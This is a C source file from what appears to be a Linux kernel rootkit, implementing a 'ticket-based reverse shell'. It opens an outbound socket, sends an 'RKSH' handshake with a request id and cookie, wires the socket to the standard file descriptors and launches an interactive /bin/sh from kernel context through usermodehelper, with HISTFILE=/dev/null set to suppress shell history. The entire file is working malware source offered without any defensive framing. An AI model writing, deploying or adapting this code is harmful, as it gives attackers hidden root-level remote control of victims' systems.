// SPDX-License-Identifier: GPL-2.0
// execution/shell.c - Ticket-based reverse shell via usermodehelper.
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

enum rk_shell_state {
	SHELL_IDLE,
	SHELL_CONNECTING,
	SHELL_RUNNING,
	SHELL_EXITED,
	SHELL_REFUSED,
	SHELL_TIMED_OUT,
	SHELL_FAILED,
};

struct rk_shell {
	struct mutex		lock;
	enum rk_shell_state	state;
	int			exit_code;
	u32			request_id;
	u64			cookie;
	unsigned short		port;
	struct socket		*sock;
	struct file		*file;
	struct delayed_work	timeout_work;
	unsigned long		timeout_jiffies;
};

static struct rk_shell the_shell;

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

static void rk_shell_timeout_fn(struct work_struct *work)
{
	struct rk_shell *shell = container_of(
		to_delayed_work(work), struct rk_shell, timeout_work);

	mutex_lock(&shell->lock);
	if (shell->state == SHELL_RUNNING && shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	if (shell->state == SHELL_CONNECTING || shell->state == SHELL_RUNNING)
		shell->state = SHELL_TIMED_OUT;
	mutex_unlock(&shell->lock);
}

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell *shell = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!shell->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(shell->file, fd);
		if (error)
			return error;
	}
	return 0;
}

static int rk_shell_make_file(struct rk_shell *shell)
{
	struct file *file;

	file = sock_alloc_file(shell->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	shell->file = file;
	return 0;
}

static void rk_shell_release(struct rk_shell *shell)
{
	cancel_delayed_work_sync(&shell->timeout_work);

	if (shell->file) {
		fput(shell->file);
		shell->file = NULL;
		shell->sock = NULL;
	} else if (shell->sock) {
		sock_release(shell->sock);
		shell->sock = NULL;
	}
}

static int send_prelude(struct socket *sock, u32 request_id, u64 cookie)
{
	char prelude[32];
	struct msghdr msg = { 0 };
	struct kvec vec;
	int len;

	len = snprintf(prelude, sizeof(prelude), "RKSH %08x %016llx\n",
		       request_id, (unsigned long long)cookie);
	vec.iov_base = prelude;
	vec.iov_len = len;
	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static struct rk_shell exec_shell;
static void rk_exec_shell_work(struct work_struct *work);
static DECLARE_WORK(exec_shell_work_item, rk_exec_shell_work);

static void rk_do_shell_work(struct rk_shell *shell, char **argv)
{
	struct socket *sock;
	struct subprocess_info *sub;

	mutex_lock(&shell->lock);
	shell->state = SHELL_CONNECTING;
	mutex_unlock(&shell->lock);

	sock = rk_connect_port(shell->port);
	if (IS_ERR(sock)) {
		mutex_lock(&shell->lock);
		shell->state = SHELL_REFUSED;
		shell->exit_code = PTR_ERR(sock);
		mutex_unlock(&shell->lock);
		return;
	}

	shell->sock = sock;

	if (send_prelude(sock, shell->request_id, shell->cookie) < 0) {
		mutex_lock(&shell->lock);
		shell->state = SHELL_FAILED;
		mutex_unlock(&shell->lock);
		rk_shell_release(shell);
		return;
	}

	if (rk_shell_make_file(shell)) {
		mutex_lock(&shell->lock);
		shell->state = SHELL_FAILED;
		mutex_unlock(&shell->lock);
		rk_shell_release(shell);
		return;
	}

	mutex_lock(&shell->lock);
	shell->state = SHELL_RUNNING;
	mutex_unlock(&shell->lock);

	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub) {
		mutex_lock(&shell->lock);
		shell->state = SHELL_FAILED;
		mutex_unlock(&shell->lock);
		rk_shell_release(shell);
		return;
	}

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	if (shell->state == SHELL_RUNNING)
		shell->state = SHELL_EXITED;
	shell->exit_code = 0;
	mutex_unlock(&shell->lock);
}

static void rk_shell_work(struct work_struct *work)
{
	char *argv[] = { "/bin/sh", "-i", NULL };

	rk_do_shell_work(&the_shell, argv);
}

static void rk_exec_shell_work(struct work_struct *work)
{
	char *argv[] = { "/bin/sh", NULL };

	rk_do_shell_work(&exec_shell, argv);
}

static DECLARE_WORK(shell_work_item, rk_shell_work);

static void shell_init_one(struct rk_shell *shell)
{
	mutex_init(&shell->lock);
	shell->state = SHELL_IDLE;
	shell->sock = NULL;
	shell->file = NULL;
	shell->timeout_jiffies = msecs_to_jiffies(shell_timeout_ms);
	INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn);
}

static void shell_stop_one(struct rk_shell *shell, struct work_struct *wi)
{
	mutex_lock(&shell->lock);
	if (shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
	cancel_delayed_work_sync(&shell->timeout_work);
	cancel_work_sync(wi);
}

void rk_shells_init(void)
{
	shell_init_one(&the_shell);
	shell_init_one(&exec_shell);
}

void rk_shells_cleanup(void)
{
	shell_stop_one(&the_shell, &shell_work_item);
	shell_stop_one(&exec_shell, &exec_shell_work_item);
}

int rk_start_shell(unsigned short port, u32 request_id, u64 cookie)
{
	int ret = 0;

	mutex_lock(&the_shell.lock);
	if (the_shell.state == SHELL_CONNECTING ||
	    the_shell.state == SHELL_RUNNING) {
		ret = -EBUSY;
	} else {
		the_shell.state = SHELL_CONNECTING;
		the_shell.port = port;
		the_shell.request_id = request_id;
		the_shell.cookie = cookie;
		the_shell.exit_code = 0;
		schedule_work(&shell_work_item);
	}
	mutex_unlock(&the_shell.lock);
	return ret;
}

int rk_start_exec_shell(unsigned short port, u32 request_id, u64 cookie)
{
	int ret = 0;

	mutex_lock(&exec_shell.lock);
	if (exec_shell.state == SHELL_CONNECTING ||
	    exec_shell.state == SHELL_RUNNING) {
		ret = -EBUSY;
	} else {
		exec_shell.state = SHELL_CONNECTING;
		exec_shell.port = port;
		exec_shell.request_id = request_id;
		exec_shell.cookie = cookie;
		exec_shell.exit_code = 0;
		schedule_work(&exec_shell_work_item);
	}
	mutex_unlock(&exec_shell.lock);
	return ret;
}

void rk_shell_status(char *buf, size_t len)
{
	static const char *state_names[] = {
		[SHELL_IDLE]      = "idle",
		[SHELL_CONNECTING] = "connecting",
		[SHELL_RUNNING]   = "running",
		[SHELL_EXITED]    = "exited",
		[SHELL_REFUSED]   = "refused",
		[SHELL_TIMED_OUT] = "timed-out",
		[SHELL_FAILED]    = "failed",
	};

	mutex_lock(&the_shell.lock);
	snprintf(buf, len, "STATE %08x %s %d",
		 the_shell.request_id,
		 state_names[the_shell.state],
		 the_shell.exit_code);
	mutex_unlock(&the_shell.lock);
}
